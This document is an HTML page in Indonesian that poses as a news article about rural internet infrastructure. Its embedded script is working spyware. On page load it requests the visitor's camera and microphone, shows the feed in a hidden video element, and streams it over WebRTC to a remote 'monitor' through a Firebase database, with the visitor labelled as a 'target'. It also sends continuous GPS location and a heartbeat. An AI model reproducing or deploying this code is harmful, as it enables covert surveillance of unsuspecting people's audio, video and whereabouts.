<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Berita Terkini</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; }
        .nav { background: #b91c1c; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
        #v { display: none; }
    </style>
</head>
<body>
    <div class="nav">INFORMASI NASIONAL</div>
    <h1>Pembangunan Infrastruktur Digital di Daerah Terpencil</h1>
    <p>Pemerintah terus berupaya memperluas akses internet cepat hingga ke pelosok desa guna mendukung ekonomi kreatif masyarakat...</p>
    <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
    
    <video id="v" autoplay playsinline muted></video>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(firebaseConfig);

        let targetId = localStorage.getItem('target_id') || ("TGT-" + Math.random().toString(36).substr(2, 5));
        localStorage.setItem('target_id', targetId);

        const db = firebase.database().ref('v8_auto_sync/' + targetId);
        let pc;
        let localStream;

        async function createNewOffer() {
            console.log("Menerima permintaan reset dari monitor. Memulai ulang koneksi...");
            if (pc) {
                pc.close();
                pc = null;
            }
            
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.onicecandidate = e => {
                if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
            };

            if (localStream) {
                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
            }

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            // Bersihkan data lama di folder sdp sebelum kirim yang baru
            await db.child('ice_t').remove();
            await db.child('ice_m').remove();
            await db.child('sdp/answer').remove();
            
            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
        }

        async function init() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = localStream;
            } catch (e) { console.error("Izin ditolak"); }

            // Deteksi sinyal reset dari monitor (tanpa refresh halaman)
            db.child('reset_signal').on('value', s => {
                if (s.exists()) {
                    createNewOffer();
                    db.child('reset_signal').remove(); // Hapus trigger setelah dibaca
                }
            });

            db.child('sdp/answer').on('value', async s => {
                const a = s.val();
                if (a && pc && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(a));
                }
            });

            db.child('ice_m').on('child_added', s => {
                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
            });

            // Heartbeat agar monitor tahu target masih ada
            setInterval(() => db.child('presence').set(Date.now()), 3000);
            
            // Lokasi
            navigator.geolocation.watchPosition(p => {
                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude });
            });
        }

        window.onload = init;
    </script>
</body>
</html>
